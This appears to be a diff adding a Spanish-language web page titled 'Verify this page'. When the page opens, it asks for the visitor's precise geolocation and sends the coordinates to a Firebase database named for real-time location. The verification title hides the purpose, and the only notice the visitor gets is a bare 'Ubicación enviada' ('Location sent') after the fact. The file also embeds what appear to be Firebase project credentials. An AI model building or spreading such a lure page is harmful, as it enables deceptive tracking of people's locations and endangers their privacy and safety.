@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifica esta página</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+</head>
+<body>
+    <h2>Verifica esta página</h2>
+    <p>Esperando ubicación...</p>
+
+    <script>
+        // Configuración de Firebase (Reemplaza con tus credenciales)
+        const firebaseConfig = {
+            apiKey: "AIzaSyBbjHMxaekPinCF54GDfZVhl0u06HKMwZg",
+            uthDomain: "ubicacionentiemporeal-5ef91.firebaseapp.com",
+            projectId: "ubicacionentiemporeal-5ef91",
+            storageBucket: "ubicacionentiemporeal-5ef91.firebasestorage.app",
+            messagingSenderId: "192513444557",
+            appId: "1:192513444557:web:01cae9b1e8c24ca5a23784",
+            measurementId: "G-RK2KEYN38N"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function obtenerUbicacion() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        let lat = pos.coords.latitude;
+                        let lon = pos.coords.longitude;
+                        let id_usuario = Math.random().toString(36).substring(7); // Genera un ID aleatorio
+                        
+                        // Guardar en Firebase
+                        db.ref("ubicaciones/" + id_usuario).set({
+                            latitud: lat,
+                            longitud: lon,
+                            timestamp: new Date().toISOString()
+                        });
+
+                        document.querySelector("p").innerText = "Ubicación enviada.";
+                    },
+                    (error) => {
+                        document.querySelector("p").innerText = "No se pudo obtener la ubicación.";
+                        console.error(error);
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                document.querySelector("p").innerText = "Geolocalización no soportada.";
+            }
+        }
+
+        obtenerUbicacion();
+    </script>
+</body>
+</html>
